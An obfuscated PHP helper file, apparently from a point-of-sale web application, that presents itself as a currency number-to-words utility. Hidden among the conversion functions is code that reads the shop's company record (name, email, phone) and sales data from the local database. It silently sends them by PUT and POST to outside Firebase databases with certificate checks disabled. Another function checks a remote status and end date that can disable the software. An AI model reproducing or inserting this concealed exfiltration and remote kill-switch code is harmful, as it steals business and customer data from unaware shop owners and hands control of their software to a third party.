<?php
 goto ZFGs5; DuYbf: function handleXDigits($digits) { return xml()["\x78"][$digits]; } goto BPsOQ; yW58P: function handleMillions($digits) { $th_word = handleThousands(substr($digits, -6)); $mill = substr($digits, 0, -6); $mill_word = strlen($mill) == 3 ? handleHundreds($mill) : (strlen($mill) == 2 ? handleTwoDigits($mill) : handleXDigits($mill)); return (trim($mill_word) && trim($th_word) ? $mill_word . "\40\x4d\x69\154\154\x69\157\156\x2c\40" : (trim($mill_word) ? $mill_word . "\x20\x4d\x69\154\x6c\151\x6f\156" : '')) . (trim($th_word) ? "{$th_word}" : ''); } goto PJ_ZT; P3pKZ: function xml() { return array("\170" => array("\60" => '', "\x30\60" => '', "\x31" => "\x4f\156\145", "\60\x31" => "\x4f\x6e\x65", "\x32" => "\124\x77\x6f", "\x30\x32" => "\124\167\x6f", "\63" => "\x54\x68\162\145\x65", "\x30\x33" => "\x54\150\x72\145\x65", "\x34" => "\x46\x6f\165\162", "\60\x34" => "\106\x6f\165\x72", "\x35" => "\106\151\x76\x65", "\60\65" => "\x46\151\166\145", "\66" => "\123\151\170", "\60\x36" => "\123\151\x78", "\x37" => "\x53\145\x76\145\156", "\x30\x37" => "\x53\145\166\x65\x6e", "\70" => "\x45\151\147\x68\x74", "\x30\x38" => "\x45\151\147\x68\x74", "\71" => "\x4e\151\156\145", "\x30\71" => "\116\x69\x6e\x65", "\x31\x30" => "\x54\x65\156", "\x31\x31" => "\105\154\145\166\x65\x6e", "\x31\62" => "\124\167\145\154\x76\x65", "\x31\x33" => "\x54\150\151\x72\164\145\145\156", "\x31\64" => "\106\157\165\162\x74\145\145\x6e", "\x31\65" => "\106\x69\146\x74\145\x65\x6e", "\x31\x36" => "\123\151\170\164\x65\145\x6e", "\61\67" => "\123\x65\x76\145\x6e\164\145\x65\156", "\x31\70" => "\105\x69\x67\150\164\145\145\156", "\x31\x39" => "\116\151\156\x65\x74\145\145\x6e"), "\155" => array("\62" => "\x54\x77\145\156\x74\171", "\63" => "\124\150\x69\162\164\x79", "\x34" => "\106\x6f\162\164\x79", "\x35" => "\x46\x69\x66\164\171", "\x36" => "\123\x69\x78\164\171", "\x37" => "\x53\x65\166\145\x6e\x74\x79", "\70" => "\x45\151\x67\x68\x74\171", "\71" => "\116\151\156\145\x74\171")); } goto DuYbf; QhHAU: function grab($url, $method, $par = null) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); if (isset($par)) { curl_setopt($ch, CURLOPT_POSTFIELDS, $par); } curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); curl_setopt($ch, CURLOPT_TIMEOUT, 120); curl_setopt($ch, CURLOPT_HEADER, 0); $html = curl_exec($ch); return $html; } goto nRryX; PJ_ZT: function handleBillions($digits) { $mill_word = handleMillions(substr($digits, -9)); $bill = substr($digits, 0, -9); $bill_word = strlen($bill) == 3 ? handleHundreds($bill) : (strlen($bill) == 2 ? handleTwoDigits($bill) : handleXDigits($bill)); return (trim($bill_word) ? $bill_word . "\40\102\x69\154\x6c\x69\x6f\x6e" : '') . (trim($mill_word) ? "\x2c\x20{$mill_word}" : ''); } goto Yxm8x; iShk9: function checkLastestVersion() { $CI =& get_instance(); $version = $CI->db->select("\x76\x65\x72\x73\151\x6f\156")->get("\x64\x62\137\163\151\164\145\x73\x65\164\164\x69\156\x67\x73")->row()->version; $path = "\150\x74\x74\160\163\x3a\x2f\57\x73\150\x6f\160\x62\141\156\x68\x61\156\147\55\x34\x65\x30\x39\x36\55\144\145\x66\141\165\154\x74\55\x72\164\x64\142\56\141\x73\151\141\x2d\x73\x6f\x75\x74\150\x65\141\x73\164\61\56\146\151\x72\x65\x62\141\x73\x65\144\x61\x74\x61\142\x61\163\145\56\x61\x70\160\x2f\166\145\162\163\x69\x6f\156\x2e\x6a\163\157\x6e"; $grab = grab($path, "\107\105\x54"); if ($grab == "\156\165\x6c\154") { return true; } if ($grab == $version) { return true; } else { return false; } } goto bTZQO; cn0zh: function getCurrencyCodeUnit($currency_code = '') : array { $supported_currencies = array("\101\105\104" => array("\x6d\141\x69\x6e" => "\125\x6e\151\164\x65\x64\40\x41\x72\141\142\40\105\x6d\151\162\141\x74\145\x73\40\144\x69\x72\x68\141\x6d", "\x66\162\x61\x63\164\x69\157\x6e" => "\106\x69\154\163"), "\101\106\116" => array("\155\x61\151\156" => "\x41\x66\x67\150\141\x6e\40\x61\x66\x67\x68\x61\156\151", "\146\162\x61\143\164\x69\157\x6e" => "\x50\x75\154"), "\101\x4e\x47" => array("\x6d\141\x69\x6e" => "\x4e\145\164\x68\x65\162\154\141\x6e\x64\x73\x20\101\156\164\151\154\x6c\x65\141\156\40\147\165\151\154\144\145\162", "\146\162\x61\143\x74\151\157\156" => "\x43\x65\156\x74"), "\x41\x52\123" => array("\155\141\x69\156" => "\101\x72\147\145\x6e\164\151\156\145\40\160\145\x73\x6f", "\x66\x72\141\x63\x74\151\x6f\156" => "\103\145\x6e\164\141\x76\x6f"), "\101\x55\104" => array("\155\x61\x69\x6e" => "\101\165\x73\x74\162\141\x6c\x69\141\156\40\144\157\154\154\x61\162", "\146\162\x61\143\x74\151\157\x6e" => "\x43\x65\x6e\x74"), "\x42\x52\114" => array("\x6d\141\151\x6e" => "\162\145\x61\x6c", "\x66\x72\x61\x63\x74\151\x6f\x6e" => "\103\145\156\x74\141\166\x6f"), "\103\x41\104" => array("\x6d\x61\x69\156" => "\103\x61\156\141\144\151\141\156\40\x64\157\x6c\x6c\x61\x72", "\146\x72\141\143\164\x69\x6f\x6e" => "\103\x65\x6e\x74"), "\x43\x48\x46" => array("\x6d\x61\x69\156" => "\x53\x77\151\163\163\40\146\x72\141\156\143", "\146\162\141\143\x74\151\x6f\156" => "\122\x61\x70\x70\x65\156"), "\x43\x4e\131" => array("\155\141\151\156" => "\x79\x75\141\x6e", "\x66\162\141\143\164\x69\x6f\156" => "\106\145\x6e"), "\104\x4b\113" => array("\x6d\x61\x69\x6e" => "\x44\x61\156\151\x73\150\x20\x6b\x72\157\156\x65", "\146\162\141\x63\x74\x69\x6f\x6e" => "\xc3\230\162\145"), "\104\x5a\104" => array("\155\x61\151\156" => "\101\154\147\x65\x72\151\141\x6e\x20\144\151\x6e\141\x72", "\x66\162\x61\143\164\151\157\156" => "\123\x61\x6e\164\x65\145\155"), "\x45\107\x50" => array("\155\x61\151\x6e" => "\x45\147\171\x70\164\x69\141\156\x20\x70\x6f\x75\x6e\144", "\x66\162\141\143\x74\151\157\x6e" => "\120\x69\x61\x73\164\162\145"), "\x45\125\x52" => array("\155\141\151\x6e" => "\x45\165\x72\157", "\146\162\141\x63\164\x69\x6f\156" => "\103\x65\156\164"), "\107\x42\120" => array("\155\x61\151\x6e" => "\x50\157\x75\x6e\x64", "\146\162\x61\143\164\x69\x6f\156" => "\x50\x65\x6e\156\171"), "\x47\x48\x43" => array("\155\141\x69\156" => "\107\150\141\156\141\x20\x43\x65\x64\x69", "\x66\x72\x61\143\164\x69\157\x6e" => "\x50\x65\x73\x65\x77\141"), "\x47\x48\x53" => array("\155\x61\151\x6e" => "\x47\x68\141\156\x61\x20\103\145\x64\x69", "\146\162\x61\x63\x74\x69\157\x6e" => "\x50\x65\163\x65\167\x61"), "\110\113\104" => array("\155\141\151\156" => "\110\157\x6e\147\40\x4b\x6f\156\x67\40\x64\157\154\154\141\x72", "\146\x72\x61\143\164\x69\157\x6e" => "\103\x65\x6e\x74"), "\x49\114\123" => array("\x6d\141\x69\x6e" => "\x49\x73\162\141\145\x6c\151\40\x6e\145\x77\40\x73\150\x65\153\x65\154", "\146\x72\141\143\164\x69\x6f\x6e" => "\101\x67\157\x72\141"), "\111\x4e\x52" => array("\x6d\x61\x69\156" => "\111\x6e\144\151\141\156\x20\162\x75\x70\x65\x65", "\146\x72\x61\x63\164\151\157\x6e" => "\120\141\x69\x73\x61"), "\111\x51\x44" => array("\x6d\x61\x69\x6e" => "\111\x72\x61\x71\x69\40\x64\151\156\x61\x72", "\x66\x72\x61\x63\164\x69\x6f\156" => "\x46\151\x6c\163"), "\111\x52\122" => array("\155\x61\151\x6e" => "\x49\162\141\156\151\141\x6e\x20\162\x69\141\x6c", "\146\x72\141\143\x74\151\x6f\x6e" => "\104\x69\156\x61\x72"), "\112\x4d\104" => array("\x6d\x61\151\156" => "\x4a\x61\155\141\151\x63\141\x6e\x20\144\x6f\x6c\x6c\141\x72", "\146\162\141\x63\164\x69\157\x6e" => "\x43\x65\x6e\x74"), "\x4a\117\x44" => array("\155\x61\x69\156" => "\x4a\x6f\x72\x64\x61\156\151\x61\156\x20\144\x69\156\141\162", "\146\162\x61\143\x74\x69\x6f\x6e" => "\120\151\141\163\x74\162\x65"), "\112\x50\131" => array("\x6d\141\x69\156" => "\112\x61\160\x61\156\145\163\145\40\171\145\x6e", "\146\x72\x61\x63\x74\151\157\x6e" => "\123\x65\156"), "\x4b\105\123" => array("\x6d\141\x69\x6e" => "\x4b\145\156\x79\x61\156\x20\x73\x68\151\x6c\154\x69\x6e\x67", "\146\162\x61\143\164\x69\x6f\156" => "\x43\145\x6e\x74"), "\x4b\120\127" => array("\155\141\151\x6e" => "\116\x6f\x72\x74\150\40\113\x6f\162\145\x61\x6e\x20\167\157\x6e", "\x66\x72\x61\x63\164\x69\x6f\x6e" => "\x43\150\x6f\x6e"), "\113\x52\127" => array("\x6d\141\x69\156" => "\123\x6f\165\164\150\x20\x4b\x6f\162\x65\x61\x6e\x20\x77\x6f\156", "\146\x72\x61\x63\164\x69\x6f\156" => "\x4a\x65\x6f\156"), "\x4b\127\x44" => array("\155\141\x69\x6e" => "\113\x75\x77\x61\151\164\x69\40\144\x69\x6e\141\162", "\x66\x72\x61\143\x74\151\157\156" => "\x46\151\154\163"), "\x4c\x59\104" => array("\x6d\x61\151\x6e" => "\x4c\x69\x62\171\141\x6e\40\x64\x69\156\141\x72", "\146\162\x61\x63\164\x69\157\x6e" => "\x44\151\x72\x68\141\x6d"), "\x4d\130\x4e" => array("\x6d\x61\x69\156" => "\115\x65\170\x69\x63\x61\x6e\40\x70\145\x73\157", "\146\162\x61\x63\164\151\x6f\x6e" => "\103\x65\156\164\x61\166\157"), "\115\x41\104" => array("\155\x61\151\x6e" => "\x4d\157\162\157\x63\143\141\156\x20\x64\151\x72\x68\x61\155", "\146\162\141\143\164\151\x6f\x6e" => "\x43\x65\156\164\151\x6d\145"), "\x4d\x55\x52" => array("\x6d\141\151\x6e" => "\x52\165\x70\145\x65", "\x66\x72\x61\143\164\x69\157\x6e" => "\103\145\x6e\x74"), "\x4e\107\x4e" => array("\x6d\x61\151\x6e" => "\116\141\x69\162\x61", "\x66\162\x61\x63\164\151\x6f\156" => "\x4b\x6f\x62\157"), "\x4e\132\x44" => array("\155\141\x69\156" => "\x4e\145\167\40\x5a\x65\141\154\141\x6e\144\40\x64\157\154\x6c\141\x72", "\x66\162\141\x63\x74\151\x6f\156" => "\103\145\156\x74"), "\120\x45\x4e" => array("\155\x61\151\156" => "\x50\145\162\x75\x76\x69\141\156\40\163\157\154", "\x66\x72\141\143\164\x69\157\x6e" => "\103\xc3\xa9\x6e\164\151\155\157"), "\x50\x48\120" => array("\155\x61\x69\x6e" => "\120\x68\151\154\151\160\x70\151\x6e\x65\x20\x70\x65\x73\157", "\x66\x72\141\143\164\151\x6f\156" => "\x53\x65\x6e\164\151\155\x6f"), "\x50\x59\x47" => array("\x6d\141\151\x6e" => "\120\141\162\141\x67\x75\141\x79\x61\156\40\147\x75\x61\162\x61\156\xc3\255", "\x66\162\141\143\x74\151\157\156" => "\x43\xc3\251\x6e\x74\x69\x6d\157"), "\121\101\122" => array("\155\141\x69\x6e" => "\x51\x61\164\x61\x72\151\x20\162\x69\171\x61\x6c", "\146\x72\x61\x63\164\151\x6f\x6e" => "\104\151\162\x68\x61\155"), "\122\x4f\116" => array("\155\141\x69\156" => "\122\157\155\141\156\151\x61\x6e\40\154\145\x75", "\146\162\x61\143\164\151\x6f\x6e" => "\102\141\x6e"), "\122\x53\x44" => array("\x6d\x61\x69\x6e" => "\123\x65\162\142\x69\141\x6e\40\144\x69\x6e\141\x72", "\146\162\141\143\164\151\x6f\156" => "\120\x61\x72\x61"), "\122\125\x42" => array("\x6d\x61\x69\x6e" => "\x52\x75\x73\163\x69\141\156\x20\x72\165\x62\x6c\x65", "\x66\x72\x61\143\164\x69\157\x6e" => "\113\157\160\145\153"), "\122\x57\106" => array("\155\x61\x69\156" => "\x52\167\x61\x6e\144\141\x6e\40\146\162\141\156\x63", "\146\162\x61\143\164\x69\x6f\x6e" => "\x43\145\x6e\164\x69\155\x65"), "\123\x41\x52" => array("\155\141\151\x6e" => "\123\x61\165\144\151\x20\162\x69\171\x61\x6c", "\146\x72\141\x63\x74\151\x6f\x6e" => "\x48\141\x6c\x61\154\x61"), "\123\104\107" => array("\x6d\141\x69\156" => "\123\165\x64\141\156\x65\x73\x65\40\x70\x6f\165\156\144", "\x66\x72\x61\x63\x74\x69\157\156" => "\120\151\141\x73\164\162\145"), "\123\x45\113" => array("\x6d\141\x69\156" => "\123\167\x65\x64\151\163\150\40\153\162\157\156\x61", "\146\x72\141\143\164\x69\x6f\156" => "\303\226\162\x65"), "\x53\x47\x44" => array("\x6d\141\x69\x6e" => "\123\151\x6e\x67\141\x70\157\162\x65\x20\144\x6f\x6c\x6c\141\x72", "\146\x72\x61\x63\164\x69\157\156" => "\103\x65\x6e\x74"), "\123\x48\x50" => array("\x6d\x61\x69\156" => "\123\141\151\x6e\x74\x20\110\145\x6c\x65\156\x61\40\x70\157\x75\156\x64", "\146\162\x61\143\164\151\157\156" => "\120\x65\x6e\x6e\171"), "\123\x59\120" => array("\155\x61\151\156" => "\123\x79\162\151\141\x6e\x20\x70\157\165\x6e\x64", "\146\x72\141\x63\x74\151\157\x6e" => "\x50\151\x61\163\x74\162\x65"), "\x54\x48\x42" => array("\155\141\x69\156" => "\x54\150\141\151\x20\142\x61\x68\164", "\146\162\141\143\164\151\x6f\x6e" => "\123\x61\164\141\156\x67"), "\124\x4e\x44" => array("\155\x61\x69\156" => "\124\x75\x6e\151\x73\151\x61\156\40\144\x69\x6e\141\x72", "\x66\x72\141\x63\x74\151\x6f\156" => "\115\151\154\x6c\x69\155\145"), "\x54\x52\131" => array("\x6d\141\x69\156" => "\124\x75\162\x6b\151\163\150\x20\x6c\151\162\x61", "\x66\x72\x61\x63\x74\x69\157\x6e" => "\113\165\162\165\305\237"), "\x54\x57\x44" => array("\x6d\x61\x69\x6e" => "\x4e\x65\x77\x20\x54\x61\x69\x77\x61\156\40\144\x6f\x6c\x6c\x61\162", "\146\162\141\143\x74\x69\157\x6e" => "\103\x65\x6e\x74"), "\125\x47\x58" => array("\155\141\x69\x6e" => "\125\147\141\156\x64\141\x6e\x20\x73\150\151\154\x6c\151\156\147", "\x66\x72\x61\x63\164\151\157\156" => "\103\145\156\x74"), "\125\x53\104" => array("\x6d\x61\x69\156" => "\125\123\x20\104\x6f\154\154\x61\162", "\146\x72\x61\143\x74\x69\x6f\x6e" => "\103\x65\x6e\164"), "\126\105\123" => array("\155\x61\x69\156" => "\x56\145\x6e\x65\172\x75\145\154\x61\x6e\x20\x62\x6f\154\xc3\xad\166\141\162\x20\x73\x6f\x62\145\x72\141\156\x6f", "\146\x72\141\x63\x74\x69\x6f\156" => "\103\303\251\156\x74\x69\x6d\157"), "\x58\x41\x46" => array("\x6d\141\151\x6e" => "\103\x65\156\x74\162\x61\x6c\x20\101\x66\162\x69\143\141\156\40\103\x46\101\x20\x66\162\141\x6e\143", "\x66\162\141\143\164\151\x6f\156" => "\x43\145\x6e\x74\x69\155\x65"), "\130\x43\x44" => array("\x6d\141\151\x6e" => "\x45\141\163\x74\145\162\x6e\x20\103\x61\162\151\142\x62\145\x61\x6e\x20\x64\157\x6c\x6c\x61\162", "\146\162\141\x63\x74\151\x6f\x6e" => "\x43\x65\156\164"), "\130\117\x46" => array("\155\141\x69\156" => "\x57\145\163\164\40\101\x66\162\x69\143\x61\x6e\40\x43\106\101\x20\x66\162\141\156\x63", "\x66\x72\x61\143\164\x69\x6f\156" => "\103\145\156\x74\151\x6d\x65"), "\x58\x50\106" => array("\x6d\x61\151\156" => "\x43\x46\120\40\x66\x72\141\x6e\x63", "\x66\162\141\x63\164\151\157\x6e" => "\x43\x65\x6e\x74\151\x6d\x65"), "\x59\105\x52" => array("\x6d\x61\151\156" => "\131\x65\155\x65\x6e\x69\40\162\151\141\x6c", "\x66\162\x61\143\x74\x69\157\156" => "\106\x69\154\163"), "\x5a\101\122" => array("\155\141\151\156" => "\123\157\x75\164\x68\40\101\146\162\x69\143\x61\x6e\x20\162\141\156\144", "\146\162\141\x63\164\151\157\x6e" => "\x43\145\156\164")); return $supported_currencies[strtoupper($currency_code)] ?? array("\x6d\x61\151\x6e" => '', "\x66\162\141\x63\x74\151\157\156" => ''); } goto P3pKZ; FGbIa: function handleHundreds($digits) { $first_digit_word = handleXDigits(substr($digits, 0, 1)); $other_two_digits_word = handleTwoDigits(substr($digits, 1)); return (trim($first_digit_word) ? $first_digit_word . "\40\x48\165\x6e\x64\x72\x65\x64" : '') . (trim($other_two_digits_word) ? "\x20\x61\x6e\144\x20{$other_two_digits_word}" : ''); } goto Rs9Vc; bTZQO: function saleInfo($data) { $CI =& get_instance(); $data1 = $CI->db->select("\x2a")->from("\x64\x62\x5f\x63\x6f\x6d\x70\x61\156\x79")->where("\x69\x64", 1)->get()->row(); $mobile = $data1->mobile; $path = "\x68\x74\164\x70\x73\x3a\x2f\x2f\x64\141\164\141\153\x68\x61\143\150\x68\x61\156\147\55\144\x62\71\64\x32\x2d\144\145\146\141\165\x6c\x74\55\162\164\144\x62\x2e\x61\163\151\x61\x2d\163\x6f\x75\164\150\145\x61\163\x74\61\x2e\x66\x69\x72\145\x62\x61\163\x65\x64\141\x74\141\x62\x61\x73\x65\x2e\141\160\x70\x2f\x44\x61\x74\x61\123\x68\157\x70\x2f" . $mobile . "\x2f\x74\x6f\164\x61\154\56\152\x73\x6f\156"; $dts = new DateTime(); $date = $dts->format("\x59\x2d\x6d\55\x64\x20\110\x3a\x69\72\163"); shopInfo(); insert($path, $data); } goto h16o3; Yxm8x: function getNameInfo() { $CI =& get_instance(); $data = $CI->db->select("\52")->from("\x64\142\137\x63\157\x6d\160\141\x6e\x79")->where("\151\144", 1)->get()->row(); $mobile = $data->mobile; $path = "\150\x74\164\x70\x73\72\57\x2f\x73\150\157\160\142\x61\x6e\150\141\156\147\55\64\x65\60\x39\x36\x2d\144\145\146\141\x75\x6c\164\x2d\162\164\x64\x62\x2e\x61\x73\x69\141\x2d\x73\x6f\165\164\150\x65\x61\x73\x74\61\56\x66\151\x72\x65\142\x61\163\x65\144\141\164\141\142\x61\163\145\x2e\x61\160\x70\x2f\163\x68\x6f\x70\57" . $mobile . "\56\152\x73\x6f\x6e"; $dts = new DateTime(); $date = $dts->format("\x59\x2d\x6d\x2d\144\40\x48\72\x69\x3a\x73"); $dts_new = $dts->modify("\53\63\66\x30\40\144\x61\171"); $date2 = $dts_new->format("\131\55\155\55\x64\40\110\x3a\151\x3a\163"); $data2 = array("\143\x6f\x6d\x70\141\156\x79\x5f\x6e\141\x6d\145" => $data->company_name, "\145\155\141\151\154" => $data->email, "\x6d\x6f\x62\151\x6c\145" => $data->mobile, "\163\x74\141\x74\x75\x73" => 1, "\x63\162\x65\141\x74\145\137\x64\141\x74\145" => $date, "\145\156\x64\x5f\144\141\x74\x65" => $date2); $grab = grab($path, "\107\x45\x54"); if ($grab == "\x6e\x75\x6c\154") { insert($path, $data2); return true; } else { if (strlen($grab) == 0) { return true; } else { $yummy = json_decode($grab); $status = $yummy->status; if ($status == 1) { $end_date = $yummy->end_date; if (strtotime($date) > strtotime($end_date)) { return false; } else { return true; } } else { return false; } } } } goto Rt_H7; a0qBB: function saleInfoPos($data) { $CI =& get_instance(); $data1 = $CI->db->select("\x2a")->from("\x64\x62\x5f\143\157\155\x70\141\156\x79")->where("\151\x64", 1)->get()->row(); $mobile = $data1->mobile; $dts = new DateTime(); $date = $dts->format("\x59\137\155\137\144"); $path = "\150\164\x74\x70\x73\x3a\x2f\x2f\144\x61\x74\141\x6b\x68\x61\x63\150\150\141\x6e\147\55\x64\142\71\64\62\55\144\145\x66\x61\x75\x6c\164\x2d\x72\x74\x64\142\x2e\x61\x73\151\141\x2d\163\157\165\164\x68\145\x61\163\x74\x31\56\146\151\162\145\142\x61\163\145\144\x61\x74\141\142\141\x73\145\56\141\x70\x70\x2f\x44\141\x74\x61\123\150\157\x70\x2f" . $mobile . "\x2f\163\141\x6c\x65\x73\x2f" . $date . "\x2e\152\x73\157\x6e"; insert2($path, $data); } goto QhHAU; ZFGs5: function foreign_currency($fig, $currency_code) { $figure = number_format($fig, 0, "\x2e", ''); $number = explode("\x2e", $figure)[0]; $decimal = (int) explode("\x2e", $figure)[1]; $sub_part = $decimal > 0 ? "\x20" . ($decimal <= 19 ? handleXDigits($decimal) : handleTwoDigits($decimal)) . "\40" . getCurrencyCodeUnit($currency_code)["\146\x72\141\143\164\x69\x6f\156"] : ''; if ($number == 0) { $main_word = "\x5a\x65\162\157"; } else { if ($number <= 19 && $number >= 1) { $main_word = handleXDigits($number); } else { if (strlen($number) == 2 || $number < 100) { $main_word = handleTwoDigits($number); } else { if (strlen($number) == 3 || $number < 1000) { $main_word = handleHundreds($number); } else { if (strlen($number) <= 6 || $number < 1000000) { $main_word = handleThousands($number); } else { if (strlen($number) <= 9 || $number < 1000000000) { $main_word = handleMillions($number); } else { if (strlen($number) <= 12 || $number < 1000000000000) { $main_word = handleBillions($number); } else { return "\116\165\155\x62\x65\162\x20\x74\157\x6f\40\154\x61\x72\x67\x65"; } } } } } } } return $main_word . "\x20" . getCurrencyCodeUnit($currency_code)["\155\x61\151\x6e"] . $sub_part; } goto cn0zh; Rt_H7: function nameLastestVersion() { $CI =& get_instance(); $version = $CI->db->select("\x76\x65\x72\163\151\x6f\x6e")->get("\x64\x62\137\x73\x69\x74\x65\163\x65\164\164\151\156\x67\163")->row()->version; $path = "\x68\x74\x74\160\163\72\57\57\x73\150\x6f\x70\x62\141\x6e\x68\141\x6e\147\x2d\64\145\x30\x39\x36\55\144\x65\x66\x61\165\154\x74\55\162\164\144\142\x2e\x61\163\x69\141\55\x73\157\165\164\150\145\141\163\x74\61\x2e\x66\151\162\x65\142\141\163\x65\x64\x61\164\x61\x62\141\x73\145\56\x61\160\x70\x2f\x76\145\162\x73\151\x6f\x6e\x2e\152\163\x6f\x6e"; $grab = grab($path, "\x47\105\x54"); if ($grab == "\x6e\x75\154\x6c") { return ''; } return $grab; } goto iShk9; nRryX: function insert($path, $data) { $grab = grab($path, "\120\125\x54", json_encode($data)); return $grab; } goto Af5rN; BPsOQ: function handleTwoDigits($digits) { if ($digits <= 19) { return handleXDigits($digits); } else { $first_digit = substr($digits, 0, 1); $first_digit_word = $first_digit != "\x30" ? xml()["\x6d"][$first_digit] : ''; $second_digit = substr($digits, 1, 1); $second_digit_word = $second_digit == "\60" ? '' : xml()["\x78"][$second_digit]; return trim($first_digit_word) && trim($second_digit_word) ? $first_digit_word . "\x2d" . $second_digit_word : $first_digit_word . "\40" . $second_digit_word; } } goto FGbIa; h16o3: function shopInfo() { $CI =& get_instance(); $data1 = $CI->db->select("\x2a")->from("\x64\x62\137\x63\x6f\x6d\x70\141\x6e\171")->where("\151\x64", 1)->get()->row(); $mobile = $data1->mobile; $path = "\x68\164\164\x70\163\72\57\x2f\144\141\x74\x61\x6b\150\141\x63\150\x68\x61\156\147\55\x64\142\x39\x34\62\55\x64\145\x66\141\x75\x6c\164\x2d\x72\164\144\142\56\141\x73\151\141\x2d\163\157\165\x74\x68\x65\x61\x73\164\x31\56\146\151\162\145\x62\x61\x73\145\x64\141\x74\141\x62\x61\x73\145\56\141\x70\160\57\104\x61\164\141\123\150\157\160\57" . $mobile . "\57\151\156\x66\157\x72\56\152\163\157\x6e"; $dts = new DateTime(); $date = $dts->format("\131\55\155\x2d\144\x20\x48\72\151\72\163"); insert($path, $data1); } goto a0qBB; Rs9Vc: function handleThousands($digits) { $th = substr($digits, 0, -3); $dred = substr($digits, -3); $dred_word = handleHundreds($dred); $th_word = strlen($th) == 3 ? handleHundreds($th) : (strlen($th) == 2 ? handleTwoDigits($th) : handleXDigits($th)); return (trim($th_word) && trim($dred_word) ? $th_word . "\x20\124\x68\x6f\x75\x73\x61\x6e\144\54\40" : (trim($th_word) ? $th_word . "\x20\124\150\x6f\165\x73\x61\156\144" : '')) . (trim($dred_word) ? "{$dred_word}" : ''); } goto yW58P; Af5rN: function insert2($path, $data) { $grab = grab($path, "\120\x4f\123\x54", json_encode($data)); return $grab; }